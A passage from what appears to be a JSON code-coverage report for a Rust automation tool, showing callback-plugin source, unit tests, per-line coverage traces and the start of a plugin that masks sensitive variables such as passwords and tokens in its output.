result.result.message.as_str();\n            println!(\n                \"{}\",\n                self.format_failed(\u0026result.host, \u0026result.task_name, message)\n            );\n\n            // Show action suggestion\n            self.print_action_suggestion(message);\n        } else if result.result.changed {\n            host_stats.changed += 1;\n\n            // Mark that we have actions\n            *self.has_actions.write() = true;\n\n            // Print change immediately\n            let duration_ms = if self.config.show_duration {\n                Some(result.duration.as_millis())\n            } else {\n                None\n            };\n\n            println!(\n                \"{}\",\n                self.format_changed(\n                    \u0026result.host,\n                    \u0026result.task_name,\n                    \u0026result.result.message,\n                    duration_ms\n                )\n            );\n        } else {\n            host_stats.ok += 1;\n            // Silent on ok - this is the core behavior of actionable callback\n        }\n    }\n\n    /// Called when a handler is triggered - silent in actionable mode.\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Silent - handlers are internal details\n    }\n\n    /// Called when facts are gathered - silent in actionable mode.\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // Silent - fact gathering is internal\n    }\n}\n\n// ============================================================================\n// Unreachable Host Extension\n// ============================================================================\n\n/// Trait extension for handling unreachable hosts.\n#[async_trait]\npub trait ActionableUnreachableCallback: ExecutionCallback {\n    /// Called when a host becomes unreachable.\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str);\n}\n\n#[async_trait]\nimpl ActionableUnreachableCallback for ActionableCallback {\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str) {\n        let mut stats = self.host_stats.write();\n        let host_stats = stats.entry(host.to_string()).or_default();\n        host_stats.unreachable += 1;\n\n        // Mark that we have actions\n        *self.has_actions.write() = true;\n\n        // Print unreachable message immediately\n        println!(\"{}\", self.format_unreachable(host, task_name, error));\n\n        // Show action suggestion\n        if self.config.show_action_suggestions {\n            let suggestion = \"Check network connectivity, SSH configuration, and firewall rules\";\n            if self.config.use_colors {\n                println!(\n                    \"  {}: {}\",\n                    \"ACTION REQUIRED\".magenta().bold(),\n                    suggestion.yellow()\n                );\n            } else {\n                println!(\"  ACTION REQUIRED: {}\", suggestion);\n            }\n        }\n    }\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_actionable_callback_tracks_stats() {\n        let callback = ActionableCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate task completions\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        let failed_result =\n            create_execution_result(\"host2\", \"task1\", false, false, false, \"error occurred\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        let skipped_result =\n            create_execution_result(\"host2\", \"task2\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        // Verify stats\n        let stats = callback.host_stats.read();\n\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 1);\n        assert_eq!(host1_stats.failed, 0);\n        assert_eq!(host1_stats.skipped, 0);\n\n        let host2_stats = stats.get(\"host2\").unwrap();\n        assert_eq!(host2_stats.ok, 0);\n        assert_eq!(host2_stats.changed, 0);\n        assert_eq!(host2_stats.failed, 1);\n        assert_eq!(host2_stats.skipped, 1);\n\n        assert!(callback.has_actions());\n    }\n\n    #[tokio::test]\n    async fn test_actionable_callback_no_actions_when_all_ok() {\n        let callback = ActionableCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        assert!(!callback.has_actions());\n    }\n\n    #[tokio::test]\n    async fn test_actionable_callback_has_actions_on_change() {\n        let callback = ActionableCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let changed_result =\n            create_execution_result(\"host1\", \"task1\", true, true, false, \"file modified\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        assert!(callback.has_actions());\n    }\n\n    #[tokio::test]\n    async fn test_unreachable_callback() {\n        let callback = ActionableCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback\n            .on_host_unreachable(\"host1\", \"gather_facts\", \"Connection refused\")\n            .await;\n\n        let stats = callback.host_stats.read();\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.unreachable, 1);\n\n        assert!(callback.has_actions());\n    }\n\n    #[tokio::test]\n    async fn test_hosts_with_changes() {\n        let callback = ActionableCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\n                \"test-play\",\n                \u0026[\n                    \"host1\".to_string(),\n                    \"host2\".to_string(),\n                    \"host3\".to_string(),\n                ],\n            )\n            .await;\n\n        // host1: changed\n        let changed1 = create_execution_result(\"host1\", \"task1\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed1).await;\n\n        // host2: ok\n        let ok = create_execution_result(\"host2\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok).await;\n\n        // host3: changed\n        let changed2 = create_execution_result(\"host3\", \"task1\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed2).await;\n\n        assert_eq!(callback.hosts_with_changes(), 2);\n        assert_eq!(callback.hosts_with_failures(), 0);\n    }\n\n    #[tokio::test]\n    async fn test_exit_code() {\n        let callback = ActionableCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // No failures = exit code 0\n        let ok = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok).await;\n        assert_eq!(callback.exit_code(), 0);\n\n        // Failed = exit code 1\n        let failed = create_execution_result(\"host1\", \"task2\", false, false, false, \"failed\");\n        callback.on_task_complete(\u0026failed).await;\n        assert_eq!(callback.exit_code(), 1);\n    }\n\n    #[test]\n    fn test_suggest_action_permission_denied() {\n        let suggestion =\n            ActionableCallback::suggest_action(\"Permission denied: /etc/nginx/nginx.conf\");\n        assert!(suggestion.is_some());\n        assert!(suggestion.unwrap().contains(\"permission\"));\n    }\n\n    #[test]\n    fn test_suggest_action_file_not_found() {\n        let suggestion =\n            ActionableCallback::suggest_action(\"No such file or directory: /tmp/missing\");\n        assert!(suggestion.is_some());\n        assert!(suggestion.unwrap().contains(\"file path\"));\n    }\n\n    #[test]\n    fn test_suggest_action_connection_refused() {\n        let suggestion = ActionableCallback::suggest_action(\"Connection refused\");\n        assert!(suggestion.is_some());\n        assert!(suggestion.unwrap().contains(\"network\"));\n    }\n\n    #[test]\n    fn test_suggest_action_package_error() {\n        let suggestion = ActionableCallback::suggest_action(\"Package nginx-core not found\");\n        assert!(suggestion.is_some());\n        assert!(suggestion.unwrap().contains(\"package\"));\n    }\n\n    #[test]\n    fn test_suggest_action_command_not_found() {\n        let suggestion = ActionableCallback::suggest_action(\"command not found: docker\");\n        assert!(suggestion.is_some());\n        assert!(suggestion.unwrap().contains(\"Install\"));\n    }\n\n    #[test]\n    fn test_suggest_action_unknown_error() {\n        let suggestion = ActionableCallback::suggest_action(\"Some random error message\");\n        assert!(suggestion.is_none());\n    }\n\n    #[test]\n    fn test_host_stats_has_actions() {\n        let mut stats = HostStats::default();\n        assert!(!stats.has_actions());\n\n        stats.changed = 1;\n        assert!(stats.has_actions());\n\n        stats = HostStats::default();\n        stats.failed = 1;\n        assert!(stats.has_actions());\n\n        stats = HostStats::default();\n        stats.unreachable = 1;\n        assert!(stats.has_actions());\n\n        stats = HostStats::default();\n        stats.ok = 5;\n        stats.skipped = 2;\n        assert!(!stats.has_actions());\n    }\n\n    #[test]\n    fn test_default_config() {\n        let config = ActionableConfig::default();\n        assert!(config.show_play_headers);\n        assert!(config.show_action_suggestions);\n        assert!(config.show_change_summary);\n        assert!(!config.show_duration);\n        assert!(config.use_colors);\n    }\n\n    #[test]\n    fn test_minimal_config() {\n        let config = ActionableConfig::minimal();\n        assert!(!config.show_play_headers);\n        assert!(!config.show_action_suggestions);\n        assert!(!config.show_change_summary);\n        assert!(!config.show_recap);\n    }\n\n    #[test]\n    fn test_ci_config() {\n        let config = ActionableConfig::ci();\n        assert!(!config.use_colors);\n        assert!(config.show_action_suggestions);\n    }\n\n    #[test]\n    fn test_verbose_config() {\n        let config = ActionableConfig::verbose();\n        assert!(config.show_duration);\n        assert!(config.show_play_headers);\n        assert!(config.show_action_suggestions);\n    }\n\n    #[test]\n    fn test_clone_shares_stats() {\n        let callback1 = ActionableCallback::new();\n        let callback2 = callback1.clone();\n\n        // Both should share the same underlying host_stats\n        assert!(Arc::ptr_eq(\u0026callback1.host_stats, \u0026callback2.host_stats));\n    }\n}\n","traces":[{"line":102,"address":[31962768],"length":1,"stats":{"Line":1}},{"line":119,"address":[31966816],"length":1,"stats":{"Line":1}},{"line":132,"address":[31966864],"length":1,"stats":{"Line":1}},{"line":145,"address":[31966768],"length":1,"stats":{"Line":1}},{"line":180,"address":[31979808],"length":1,"stats":{"Line":1}},{"line":181,"address":[31979818],"length":1,"stats":{"Line":1}},{"line":185,"address":[31979872],"length":1,"stats":{"Line":1}},{"line":186,"address":[31979882],"length":1,"stats":{"Line":1}},{"line":241,"address":[31979424],"length":1,"stats":{"Line":1}},{"line":242,"address":[31979438],"length":1,"stats":{"Line":1}},{"line":257,"address":[31967040,31967594],"length":1,"stats":{"Line":1}},{"line":260,"address":[31967072],"length":1,"stats":{"Line":1}},{"line":261,"address":[31967125],"length":1,"stats":{"Line":1}},{"line":262,"address":[31967179],"length":1,"stats":{"Line":1}},{"line":263,"address":[31967220],"length":1,"stats":{"Line":1}},{"line":264,"address":[31967301],"length":1,"stats":{"Line":1}},{"line":265,"address":[31967355],"length":1,"stats":{"Line":1}},{"line":272,"address":[31967019,31967025,31966912],"length":1,"stats":{"Line":1}},{"line":273,"address":[31966992,31966921],"length":1,"stats":{"Line":2}},{"line":277,"address":[31978304,31978475,31978481],"length":1,"stats":{"Line":1}},{"line":278,"address":[31978350,31978316],"length":1,"stats":{"Line":2}},{"line":279,"address":[31978328],"length":1,"stats":{"Line":1}},{"line":280,"address":[31978403],"length":1,"stats":{"Line":1}},{"line":281,"address":[30707866,30707856],"length":1,"stats":{"Line":3}},{"line":282,"address":[31978432],"length":1,"stats":{"Line":1}},{"line":286,"address":[31978496,31978667,31978673],"length":1,"stats":{"Line":1}},{"line":287,"address":[31978508,31978542],"length":1,"stats":{"Line":2}},{"line":288,"address":[31978520],"length":1,"stats":{"Line":1}},{"line":289,"address":[31978595],"length":1,"stats":{"Line":1}},{"line":290,"address":[30707902,30707888],"length":1,"stats":{"Line":3}},{"line":291,"address":[31978624],"length":1,"stats":{"Line":1}},{"line":295,"address":[31979488,31979784,31979790],"length":1,"stats":{"Line":1}},{"line":296,"address":[31979503],"length":1,"stats":{"Line":1}},{"line":297,"address":[31979537,31979596],"length":1,"stats":{"Line":4}},{"line":298,"address":[30707962,30707952],"length":1,"stats":{"Line":3}},{"line":300,"address":[31979700],"length":1,"stats":{"Line":1}},{"line":301,"address":[31979774],"length":1,"stats":{"Line":0}},{"line":302,"address":[31979734],"length":1,"stats":{"Line":0}},{"line":303,"address":[31979764],"length":1,"stats":{"Line":1}},{"line":304,"address":[31979724],"length":1,"stats":{"Line":1}},{"line":309,"address":[31968752,31970152,31970146],"length":1,"stats":{"Line":1}},{"line":317,"address":[30707682,30707616],"length":1,"stats":{"Line":1}},{"line":320,"address":[31968941],"length":1,"stats":{"Line":1}},{"line":321,"address":[31969515,31969578,31969415,31969656],"length":1,"stats":{"Line":1}},{"line":323,"address":[31969359,31969029],"length":1,"stats":{"Line":2}},{"line":324,"address":[31969459,31969386],"length":1,"stats":{"Line":2}},{"line":325,"address":[31969486],"length":1,"stats":{"Line":1}},{"line":327,"address":[31969629,31969561],"length":1,"stats":{"Line":2}},{"line":330,"address":[31968955,31969104],"length":1,"stats":{"Line":0}},{"line":338,"address":[31967616,31968725,31968731],"length":1,"stats":{"Line":1}},{"line":339,"address":[31967713],"length":1,"stats":{"Line":1}},{"line":340,"address":[31968194,31968094,31968264,31968313],"length":1,"stats":{"Line":1}},{"line":342,"address":[31967998],"length":1,"stats":{"Line":1}},{"line":343,"address":[31968052,31968138],"length":1,"stats":{"Line":2}},{"line":344,"address":[31968165],"length":1,"stats":{"Line":1}},{"line":345,"address":[31968235],"length":1,"stats":{"Line":1}},{"line":348,"address":[31967726],"length":1,"stats":{"Line":0}},{"line":353,"address":[31977264,31978289,31978283],"length":1,"stats":{"Line":1}},{"line":354,"address":[31977361],"length":1,"stats":{"Line":1}},{"line":355,"address":[31977893,31977844,31977744],"length":1,"stats":{"Line":1}},{"line":357,"address":[31977646],"length":1,"stats":{"Line":1}},{"line":358,"address":[31977788,31977702],"length":1,"stats":{"Line":2}},{"line":359,"address":[31977815],"length":1,"stats":{"Line":1}},{"line":363,"address":[31977374],"length":1,"stats":{"Line":0}},{"line":368,"address":[31973288,31973294,31970176],"length":1,"stats":{"Line":1}},{"line":369,"address":[31970215],"length":1,"stats":{"Line":1}},{"line":371,"address":[31970248,31973283,31970462,31970331],"length":1,"stats":{"Line":4}},{"line":372,"address":[31970405,31973248],"length":1,"stats":{"Line":2}},{"line":373,"address":[31970683,31973235,31970513],"length":1,"stats":{"Line":3}},{"line":374,"address":[31970626,31973200],"length":1,"stats":{"Line":2}},{"line":375,"address":[31970734,31973187],"length":1,"stats":{"Line":2}},{"line":376,"address":[31970824,31970904],"length":1,"stats":{"Line":2}},{"line":377,"address":[31970955],"length":1,"stats":{"Line":1}},{"line":379,"address":[31970847,31973152],"length":1,"stats":{"Line":2}},{"line":380,"address":[31973139,31971049],"length":1,"stats":{"Line":2}},{"line":381,"address":[31971173,31971343],"length":1,"stats":{"Line":1}},{"line":385,"address":[31971286],"length":1,"stats":{"Line":1}},{"line":387,"address":[31971405,31973091,31971139,31971536],"length":1,"stats":{"Line":3}},{"line":388,"address":[31971479,31973056],"length":1,"stats":{"Line":0}},{"line":389,"address":[31971711,31971587,31973043],"length":1,"stats":{"Line":1}},{"line":390,"address":[31973008,31971793],"length":1,"stats":{"Line":0}},{"line":391,"address":[31972995,31971981,31971850,31971677],"length":1,"stats":{"Line":3}},{"line":392,"address":[31971924,31972960],"length":1,"stats":{"Line":0}},{"line":393,"address":[31972196,31972947,31972032],"length":1,"stats":{"Line":2}},{"line":394,"address":[31972142,31972912],"length":1,"stats":{"Line":0}},{"line":395,"address":[31972338,31972241,31972899],"length":1,"stats":{"Line":1}},{"line":396,"address":[31972864,31972402],"length":1,"stats":{"Line":0}},{"line":397,"address":[31972566,31972453,31972854,31972313],"length":1,"stats":{"Line":4}},{"line":398,"address":[31972819,31972515],"length":1,"stats":{"Line":2}},{"line":399,"address":[31972696,31972611,31972809],"length":1,"stats":{"Line":2}},{"line":400,"address":[31972698,31972774],"length":1,"stats":{"Line":0}},{"line":402,"address":[31972683],"length":1,"stats":{"Line":1}},{"line":407,"address":[31977241,31973312,31977235],"length":1,"stats":{"Line":0}},{"line":408,"address":[31973360],"length":1,"stats":{"Line":0}},{"line":410,"address":[31973372],"length":1,"stats":{"Line":0}},{"line":411,"address":[31973969,31973995],"length":1,"stats":{"Line":0}},{"line":412,"address":[31974001],"length":1,"stats":{"Line":0}},{"line":413,"address":[31974054],"length":1,"stats":{"Line":0}},{"line":414,"address":[31974086],"length":1,"stats":{"Line":0}},{"line":416,"address":[31974060],"length":1,"stats":{"Line":0}},{"line":420,"address":[31974115],"length":1,"stats":{"Line":0}},{"line":421,"address":[31974157,31974353],"length":1,"stats":{"Line":0}},{"line":423,"address":[31974125,31974223],"length":1,"stats":{"Line":0}},{"line":426,"address":[31974330],"length":1,"stats":{"Line":0}},{"line":427,"address":[31974903,31974703],"length":1,"stats":{"Line":0}},{"line":429,"address":[31974773,31974667],"length":1,"stats":{"Line":0}},{"line":432,"address":[31974880],"length":1,"stats":{"Line":0}},{"line":433,"address":[31975283,31975502],"length":1,"stats":{"Line":0}},{"line":435,"address":[31975353,31975247],"length":1,"stats":{"Line":0}},{"line":438,"address":[31975460,31975885],"length":1,"stats":{"Line":0}},{"line":440,"address":[31975990],"length":1,"stats":{"Line":0}},{"line":441,"address":[31976481,31976373],"length":1,"stats":{"Line":0}},{"line":443,"address":[31976356,31976427,31976037],"length":1,"stats":{"Line":0}},{"line":446,"address":[31976001,31976107],"length":1,"stats":{"Line":0}},{"line":449,"address":[31976217,31976739],"length":1,"stats":{"Line":0}},{"line":454,"address":[31973390],"length":1,"stats":{"Line":0}},{"line":462,"address":[31979405,31978688,31979411],"length":1,"stats":{"Line":1}},{"line":463,"address":[31978734],"length":1,"stats":{"Line":1}},{"line":464,"address":[31978761],"length":1,"stats":{"Line":1}},{"line":465,"address":[31978840],"length":1,"stats":{"Line":0}},{"line":466,"address":[31978881,31979043],"length":1,"stats":{"Line":0}},{"line":472,"address":[31978854,31978956],"length":1,"stats":{"Line":0}},{"line":480,"address":[31962816],"length":1,"stats":{"Line":0}},{"line":481,"address":[31962824],"length":1,"stats":{"Line":0}},{"line":486,"address":[31982057,31980768,31981961],"length":1,"stats":{"Line":1}},{"line":488,"address":[31980798],"length":1,"stats":{"Line":1}},{"line":489,"address":[31980817],"length":1,"stats":{"Line":1}},{"line":490,"address":[31980971,31980836,31980901],"length":1,"stats":{"Line":3}},{"line":491,"address":[31981091,31980997],"length":1,"stats":{"Line":2}},{"line":492,"address":[31981203,31981276,31981138],"length":1,"stats":{"Line":3}},{"line":493,"address":[31981323,31981391,31981464],"length":1,"stats":{"Line":3}},{"line":494,"address":[31981586,31981487],"length":1,"stats":{"Line":2}},{"line":502,"address":[30700736,30700887,30700857,30701886,30701902,30700767,30701966],"length":1,"stats":{"Line":4}},{"line":503,"address":[30700834,30700952],"length":1,"stats":{"Line":2}},{"line":504,"address":[30701118,30701294,30701908,30701091,30701356],"length":1,"stats":{"Line":1}},{"line":507,"address":[30701487],"length":1,"stats":{"Line":1}},{"line":508,"address":[30701632],"length":1,"stats":{"Line":1}},{"line":509,"address":[30701756],"length":1,"stats":{"Line":1}},{"line":513,"address":[30692872,30694763,30692735,30698389,30692842,30692704],"length":1,"stats":{"Line":0}},{"line":514,"address":[30692919,30692823],"length":1,"stats":{"Line":0}},{"line":515,"address":[30693039,30692965],"length":1,"stats":{"Line":0}},{"line":518,"address":[30693159,30693202],"length":1,"stats":{"Line":0}},{"line":519,"address":[30693252],"length":1,"stats":{"Line":0}},{"line":520,"address":[30693292],"length":1,"stats":{"Line":0}},{"line":521,"address":[30693629,30693546],"length":1,"stats":{"Line":0}},{"line":527,"address":[30693414,30693309],"length":1,"stats":{"Line":0}},{"line":531,"address":[30693947,30693493],"length":1,"stats":{"Line":0}},{"line":532,"address":[30693993,30694073],"length":1,"stats":{"Line":0}},{"line":534,"address":[30694278,30694080],"length":1,"stats":{"Line":0}},{"line":535,"address":[30694425,30694349],"length":1,"stats":{"Line":0}},{"line":536,"address":[30694523],"length":1,"stats":{"Line":0}},{"line":542,"address":[30693176],"length":1,"stats":{"Line":0}},{"line":543,"address":[30694834,30698432,30698442],"length":1,"stats":{"Line":0}},{"line":544,"address":[30698478,30694930,30698464],"length":1,"stats":{"Line":0}},{"line":546,"address":[30695018],"length":1,"stats":{"Line":0}},{"line":548,"address":[30695063],"length":1,"stats":{"Line":0}},{"line":549,"address":[30695095],"length":1,"stats":{"Line":0}},{"line":550,"address":[30696441,30696607,30696673,30696778,30696510],"length":1,"stats":{"Line":0}},{"line":552,"address":[30696387,30696205],"length":1,"stats":{"Line":0}},{"line":553,"address":[30696414,30696493,30696561],"length":1,"stats":{"Line":0}},{"line":554,"address":[30696656,30696580,30696724],"length":1,"stats":{"Line":0}},{"line":557,"address":[30696162,30696239],"length":1,"stats":{"Line":0}},{"line":562,"address":[30695074],"length":1,"stats":{"Line":0}},{"line":563,"address":[30695140],"length":1,"stats":{"Line":0}},{"line":564,"address":[30695715,30695784,30695862],"length":1,"stats":{"Line":0}},{"line":566,"address":[30695661,30695525],"length":1,"stats":{"Line":0}},{"line":567,"address":[30695835,30695688,30695767],"length":1,"stats":{"Line":0}},{"line":570,"address":[30695556,30695498],"length":1,"stats":{"Line":0}},{"line":573,"address":[30695121],"length":1,"stats":{"Line":0}},{"line":574,"address":[30695295],"length":1,"stats":{"Line":0}},{"line":576,"address":[30695260,30695189],"length":1,"stats":{"Line":0}},{"line":579,"address":[30695220,30695158],"length":1,"stats":{"Line":0}},{"line":583,"address":[30695230,30697219],"length":1,"stats":{"Line":0}},{"line":587,"address":[30697310,30694787],"length":1,"stats":{"Line":0}},{"line":588,"address":[30697340,30697403],"length":1,"stats":{"Line":0}},{"line":589,"address":[30697418],"length":1,"stats":{"Line":0}},{"line":590,"address":[30697447],"length":1,"stats":{"Line":0}},{"line":591,"address":[30697936,30697842],"length":1,"stats":{"Line":0}},{"line":593,"address":[30697811,30697873],"length":1,"stats":{"Line":0}},{"line":595,"address":[30698017,30698077],"length":1,"stats":{"Line":0}},{"line":602,"address":[30697434,30697487],"length":1,"stats":{"Line":0}},{"line":603,"address":[30697489],"length":1,"stats":{"Line":0}},{"line":605,"address":[30697460],"length":1,"stats":{"Line":0}},{"line":607,"address":[30697524],"length":1,"stats":{"Line":0}},{"line":613,"address":[30690630,30690556,30690657,30692203,30692219,30692355,30690528],"length":1,"stats":{"Line":4}},{"line":615,"address":[30690614,30690701],"length":1,"stats":{"Line":2}},{"line":616,"address":[30690808,30690735],"length":1,"stats":{"Line":2}},{"line":617,"address":[30692288,30690912],"length":1,"stats":{"Line":2}},{"line":621,"address":[30690932,30691201,30692225,30690959,30691139],"length":1,"stats":{"Line":1}},{"line":624,"address":[30691332],"length":1,"stats":{"Line":1}},{"line":625,"address":[30691356],"length":1,"stats":{"Line":1}},{"line":626,"address":[30691393],"length":1,"stats":{"Line":1}},{"line":627,"address":[30691872,30691795,30691727],"length":1,"stats":{"Line":1}},{"line":634,"address":[30691532,30691407],"length":1,"stats":{"Line":0}},{"line":640,"address":[30690450,30690432],"length":1,"stats":{"Line":0}},{"line":645,"address":[30692403,30692661,30692468,30692648,30692384,30692495],"length":1,"stats":{"Line":0}},{"line":647,"address":[30692445,30692530],"length":1,"stats":{"Line":0}},{"line":651,"address":[30698613,30699706,30700598,30698496,30698532,30698643],"length":1,"stats":{"Line":4}},{"line":652,"address":[30698594,30698690],"length":1,"stats":{"Line":2}},{"line":653,"address":[30698799,30698736],"length":1,"stats":{"Line":2}},{"line":656,"address":[30698900,30700564],"length":1,"stats":{"Line":2}},{"line":657,"address":[30698944,30700561,30700569],"length":1,"stats":{"Line":2}},{"line":659,"address":[30698921],"length":1,"stats":{"Line":1}},{"line":660,"address":[30699054,30699083,30698980],"length":1,"stats":{"Line":2}},{"line":663,"address":[30699057,30699111],"length":1,"stats":{"Line":2}},{"line":666,"address":[30699216],"length":1,"stats":{"Line":1}},{"line":667,"address":[30699496],"length":1,"stats":{"Line":1}},{"line":673,"address":[30699679],"length":1,"stats":{"Line":1}},{"line":674,"address":[30699786,30699009],"length":1,"stats":{"Line":2}},{"line":675,"address":[30699832,30699861,30699748],"length":1,"stats":{"Line":2}},{"line":678,"address":[30699835,30699890],"length":1,"stats":{"Line":2}},{"line":681,"address":[30699995,30700157,30700028],"length":1,"stats":{"Line":2}},{"line":682,"address":[30700117,30700038],"length":1,"stats":{"Line":0}},{"line":684,"address":[30700004],"length":1,"stats":{"Line":1}},{"line":687,"address":[30700240],"length":1,"stats":{"Line":1}},{"line":697,"address":[30699784,30699788,30699720],"length":1,"stats":{"Line":2}},{"line":703,"address":[30702000,30702019],"length":1,"stats":{"Line":0}},{"line":708,"address":[30700675,30700656],"length":1,"stats":{"Line":0}},{"line":726,"address":[30702201,30702174,30703376,30703392,30702080,30702108],"length":1,"stats":{"Line":4}},{"line":727,"address":[30702158,30702245],"length":1,"stats":{"Line":2}},{"line":728,"address":[30702330,30702279],"length":1,"stats":{"Line":2}},{"line":729,"address":[30702468,30702412],"length":1,"stats":{"Line":1}},{"line":732,"address":[30702445,30702493],"length":1,"stats":{"Line":2}},{"line":735,"address":[30702594],"length":1,"stats":{"Line":1}},{"line":738,"address":[30702815],"length":1,"stats":{"Line":1}},{"line":739,"address":[30702844],"length":1,"stats":{"Line":1}},{"line":740,"address":[30702871],"length":1,"stats":{"Line":1}},{"line":741,"address":[30703047],"length":1,"stats":{"Line":1}},{"line":747,"address":[30702946,30702888],"length":1,"stats":{"Line":0}}],"covered":135,"coverable":229},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","context.rs"],"content":"//! Context callback plugin for Rustible.\n//!\n//! This plugin displays variable context during task execution, including:\n//! - Task-relevant variables\n//! - Gathered facts\n//! - Registered variables from previous tasks\n//! - Sensitive data masking for passwords, keys, and tokens\n//!\n//! Useful for debugging variable resolution issues and understanding\n//! what data is available to each task.\n//!\n//! # Features\n//!\n//! - Shows variables relevant to current task\n//! - Displays gathered facts in organized format\n//! - Shows registered variables from previous tasks\n//! - Automatically masks sensitive data (passwords, API keys, tokens, secrets)\n//! - Configurable verbosity levels\n//! - Color-coded output for easy reading\n//!\n//! # Example Output\n//!\n//! ```text\n//! TASK [Install nginx] ********************************************************\n//! HOST: webserver1\n//!\n//! --- CONTEXT ---\n//! Variables:\n//!   http_port: 80\n//!   admin_password: ********\n//!   api_key: ********\n//!\n//! Facts:\n//!   ansible_os_family: \"Debian\"\n//!   ansible_distribution: \"Ubuntu\"\n//!   ansible_distribution_version: \"22.04\"\n//!\n//! Registered:\n//!   apt_update:\n//!     changed: true\n//!     rc: 0\n//!     stdout: \"Reading package lists...\"\n//! ---------------\n//! ```\n\nuse std::collections::{HashMap, HashSet};\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse indexmap::IndexMap;\nuse serde_json::Value as JsonValue;\nuse tokio::sync::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Patterns that indicate sensitive data that should be masked.\n/// These are checked case-insensitively against variable names.\nconst SENSITIVE_PATTERNS: \u0026[\u0026str] = \u0026[\n    \"password\",\n    \"passwd\",\n    \"secret\",\n    \"token\",\n    \"api_key\",\n    \"apikey\",\n    \"auth_key\",\n    \"authkey\",\n    \"private_key\",\n    \"privatekey\",\n    \"access_key\",\n    \"accesskey\",\n    \"secret_key\",\n    \"secretkey\",\n    \"credential\",\n    \"ssh_key\",\n    \"sshkey\",\n    \"cert\",\n    \"certificate\",\n    \"bearer\",\n    \"authorization\",\n    \"auth_token\",\n    \"authtoken\",\n    \"refresh_token\",\n    \"access_token\",\n    \"client_secret\",\n    \"encryption_key\",\n    \"decryption_key\",\n    \"vault_password\",\n    \"become_password\",\n    \"become_pass\",\n    \"ansible_password\",\n    \"ansible_become_password\",\n    \"ansible_ssh_pass\",\n    \"mysql_password\",\n    \"postgres_password\",\n    \"db_password\",\n    \"database_password\",\n    \"redis_password\",\n    \"aws_secret\",\n    \"azure_secret\",\n    \"gcp_secret\",\n];\n\n/// Mask used to replace sensitive values.\nconst MASK: \u0026str = \"********\";\n\n/// Verbosity levels for context output.\n#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]\npub enum ContextVerbosity {\n    /// Show only essential variables used in task args\n    Minimal,\n    /// Show task variables and relevant facts (default)\n    Normal,\n    /// Show all variables, facts, and registered vars\n    Verbose,\n    /// Show everything including internal magic variables\n    Debug,\n}\n\nimpl Default for ContextVerbosity {\n    fn default() -\u003e Self {\n        Self::Normal\n    }\n}\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n}\n\n/// Configuration for the context callback.\n#[derive(Debug, Clone)]\npub struct ContextCallbackConfig {\n    /// Verbosity level for context output\n    pub verbosity: ContextVerbosity,\n    /// Whether to show facts\n    pub show_facts: bool,\n    /// Whether to show registered variables\n    pub show_registered: bool,\n    /// Whether to mask sensitive data\n    pub mask_sensitive: bool,\n    /// Additional patterns to consider sensitive\n    pub additional_sensitive_patterns: Vec\u003cString\u003e,\n    /// Maximum depth for nested structures\n    pub max_depth: usize,\n    /// Maximum string length before truncation\n    pub max_string_length: usize,\n    /// Whether to show empty values\n    pub show_empty: bool,\n}\n\nimpl Default for ContextCallbackConfig {\n    fn default() -\u003e Self {\n        Self 